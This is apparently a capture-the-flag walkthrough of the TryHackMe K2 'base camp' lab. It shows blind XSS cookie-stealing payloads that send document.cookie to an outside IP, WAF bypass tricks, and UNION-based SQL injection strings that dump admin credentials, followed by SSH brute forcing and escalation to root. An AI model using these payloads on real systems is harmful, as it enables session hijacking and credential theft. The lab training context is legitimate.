
# SCANNING
I performed an **nmap** aggressive scan on the target and found 2 open ports, 22 and 80 running **ssh** and **http** respectively.

![](IMAGES/BASE%20CAMP/1.png)

# FOOTHOLD
I mapped the *k2.thm* domain to the IP address in my host file and accessed the site through my browser.

![](IMAGES/BASE%20CAMP/2.png)

The home page contained nothing of interest, so I used **ffuf** to enumerate subdomains and found some.

![](IMAGES/BASE%20CAMP/3.png)

I updated my host file and accessed the subdomains. Both of them required us to log in using a username and password.

![](IMAGES/BASE%20CAMP/4.png)

![](IMAGES/BASE%20CAMP/5.png)

The *it.k2.thm* domain allowed us to register a new user. So I registered a user and logged in.

![](IMAGES/BASE%20CAMP/6.png)

After logging in, I had 2 input fields. I could give a title and a description. Since this was a ticket system, it would likely be reviewed by a privileged user.

![](IMAGES/BASE%20CAMP/7.png)

I entered a random title and description and got a confirmation that the ticket was being sent for review.

![](IMAGES/BASE%20CAMP/8.png)

I used **Burp**'s **Repeater** tab to test for cross site scripting by making the target send an HTTP request on a web server hosted locally. I used the following script in the title and description and encoded it:

```
Title: <script src='http://ATTACKER_IP/title'></script>
Description: <script src='http://ATTACKER_IP/description'></script>
```

![](IMAGES/BASE%20CAMP/9.png)

I started an **http** server locally and started receiving requests for the */desc* endpoint, this meant that the description field was vulnerable to cross site scripting.

![](IMAGES/BASE%20CAMP/10.png)

I then used the following payload to send a base64 encoded cookie of the privileged user interacting with our ticket to our web server.

```
<script>
fetch('http://10.21.17.140/cookie='+btoa(document.cookie));
</script>
```

![](IMAGES/BASE%20CAMP/11.png)

However, this activated the WAF and got blocked.

![](IMAGES/BASE%20CAMP/12.png)

I then reviewed my payload and modified its characters to find what caused the WAF to block it. I found that *document.cookie* was the problem. So, I used **ChatGPT** to find alternate ways to write *document.cookie* and found a method.

![](IMAGES/BASE%20CAMP/13.png)

I replaced *`document.cookie`* with *`document["cookie"]`* and was able to bypass the WAF.

![](IMAGES/BASE%20CAMP/14.png)

My web server received the cookie value from the target.

![](IMAGES/BASE%20CAMP/15.png)

I decoded the cookie.

![](IMAGES/BASE%20CAMP/16.png)

I then added this value to the *admin.k2.thm*.

![](IMAGES/BASE%20CAMP/17.png)

Since the *ticket.k2.thm* domain had a *dashboard* endpoint, this would also have the same. So I directly navigated to the *dashboard* endpoint and got access to it.

![](IMAGES/BASE%20CAMP/18.png)

I could filter tickets based on the titles. This functionality could be running on an sql server in the backend, so I forwarded a request made here to **Burp**'s **Repeater** tab.

![](IMAGES/BASE%20CAMP/19.png)

I tried a simple payload but got blocked by the WAF.

```
' OR 1=1-- -
```

![](IMAGES/BASE%20CAMP/20.png)

However, when I removed the space between `'` and `OR`, I was able to bypass the filter...

```
'OR 1=1-- -
```

![](IMAGES/BASE%20CAMP/21.png)

I then enumerated the number of columns and columns that were reflected back to us:

```
'UNION SELECT 1,2,3-- -
```

![](IMAGES/BASE%20CAMP/22.png)

After finding out the columns, I enumerated the table names present in the current database:

```
'UNION SELECT NULL,NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
```

![](IMAGES/BASE%20CAMP/23.png)

The *admin_auth* and *auth_users* seemed interesting, so I enumerated the columns in these tables:

```
'UNION SELECT NULL,NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name="admin_auth"-- -
```

![](IMAGES/BASE%20CAMP/24.png)

```
'UNION SELECT NULL,NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name="auth_users"-- -
```

![](IMAGES/BASE%20CAMP/25.png)

I then looked at the contents inside *auth_users* table:

```
'UNION SELECT group_concat(auth_username),NULL,group_concat(auth_password) FROM auth_users-- -
```

However, this only contained the credentials of the user that I had created.

![](IMAGES/BASE%20CAMP/26.png)

I then looked at the contents inside the *admin_auth* table and found a bunch of username and passwords:

```
'UNION SELECT admin_username,NULL,admin_password FROM admin_auth-- -
```

![](IMAGES/BASE%20CAMP/27.png)

I created a wordlist of usernames and passwords and brute forced a valid **ssh** credential using **hydra**.

![](IMAGES/BASE%20CAMP/28.png)

I then logged into the system as *james*.

![](IMAGES/BASE%20CAMP/29.png)

Finally, I captured the user flag from *james*'s home directory.

![](IMAGES/BASE%20CAMP/30.png)

# PRIVILEGE ESCALATION

Viewing the group membership of *james* revealed that he was part of the *adm* group. This meant that he could read logs inside the */var/log* directory.

![](IMAGES/BASE%20CAMP/31.png)

I then went through various log files and found a password inside the *nginx* access log.

![](IMAGES/BASE%20CAMP/32.png)

The password was used with the *rose* user but when i tried using it to switch to *rose*, it failed. I then tried using it against *root* and got access as *root*.

![](IMAGES/BASE%20CAMP/33.png)

I then captured the *root* flag.

![](IMAGES/BASE%20CAMP/34.png)

As root, I was able to read the contents inside *rose*'s home directory and found her password in the bash history file.

![](IMAGES/BASE%20CAMP/35.png)

The */etc/passwd* file also had something unusual, it had the full names of the users Rose and James. I kept note of that as it could be useful in the future.

![](IMAGES/BASE%20CAMP/36.png)

After successfully pwning the base camp, I moved onto the middle camp.

---
